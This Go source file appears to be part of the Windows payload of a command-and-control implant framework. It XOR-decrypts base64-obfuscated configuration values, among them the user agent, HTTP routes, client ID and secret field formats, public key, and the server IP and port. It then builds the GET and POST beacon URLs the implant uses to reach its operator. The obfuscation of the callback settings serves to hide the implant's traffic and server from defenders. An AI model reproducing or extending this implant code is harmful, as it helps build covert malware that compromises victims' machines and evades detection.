// server/docker/payloads/Windows/getEnv.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strings"
)

func xorDecrypt(encoded, key string) (string, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}

	var result []byte
	for i := 0; i < len(decoded); i++ {
		result = append(result, decoded[i]^key[i%len(key)])
	}

	return string(result), nil
}

func decryptAllValues() map[string]string {
	decrypted := make(map[string]string)

	toDecrypt := map[string]string{
		"User Agent":            userAgent,
		"Content Type":          contentType,
		"Custom Headers":        customHeaders,
		"GET Route":             getRoute,
		"POST Route":            postRoute,
		"GET Method":            getMethod,  // Changed from "GET Method" to match
		"POST Method":           postMethod, // Changed from "POST Method" to match
		"GET Client ID Name":    getClientIDName,
		"GET Client ID Format":  getClientIDFormat,
		"POST Client ID Name":   postClientIDName,
		"POST Client ID Format": postClientIDFormat,
		"POST Secret Name":      postSecretName,
		"POST Secret Format":    postSecretFormat,
		"Public Key":            publicKey,
		"Secret":                secret,
		"Protocol":              protocol,
		"IP":                    ip,
		"Port":                  port,
	}

	for k, v := range toDecrypt {
		decryptedValue, err := xorDecrypt(v, xorKey)
		if err != nil {
			decrypted[k] = "DECRYPTION_FAILED"
		} else {
			decrypted[k] = decryptedValue
		}
	}

	// Set defaults for HTTP methods if they're empty or failed to decrypt
	if decrypted["GET Method"] == "" || decrypted["GET Method"] == "DECRYPTION_FAILED" {
		decrypted["GET Method"] = "GET"
		fmt.Println("Using default GET method")
	}
	if decrypted["POST Method"] == "" || decrypted["POST Method"] == "DECRYPTION_FAILED" {
		decrypted["POST Method"] = "POST"
		fmt.Println("Using default POST method")
	}

	// Log the HTTP methods being used

	return decrypted
}

// buildBaseURL constructs the base URL using protocol, IP and port
func buildBaseURL(protocol, ip, port string) string {
	// Convert protocol to lowercase
	protocol = strings.ToLower(protocol)

	// Check if we should omit the port for standard HTTP/HTTPS ports
	if (protocol == "https" && port == "443") || (protocol == "http" && port == "80") {
		return fmt.Sprintf("%s://%s", protocol, ip)
	}

	// Otherwise include the port
	return fmt.Sprintf("%s://%s:%s", protocol, ip, port)
}

// buildGetURL constructs the complete GET URL
func buildGetURL(baseURL, getRoute, clientIDName string, clientID string) string {
	// Ensure getRoute starts with /
	if !strings.HasPrefix(getRoute, "/") {
		getRoute = "/" + getRoute
	}

	// Add client ID parameter using the actual client ID value
	return fmt.Sprintf("%s%s?%s=%s",
		baseURL,
		getRoute,
		clientIDName,
		clientID)
}

// buildPostURL constructs the complete POST URL
func buildPostURL(baseURL, postRoute, clientIDName string, clientID string) string {
	// Ensure postRoute starts with /
	if !strings.HasPrefix(postRoute, "/") {
		postRoute = "/" + postRoute
	}

	// Add only client ID parameter
	return fmt.Sprintf("%s%s?%s=%s",
		baseURL,
		postRoute,
		clientIDName,
		clientID)
}
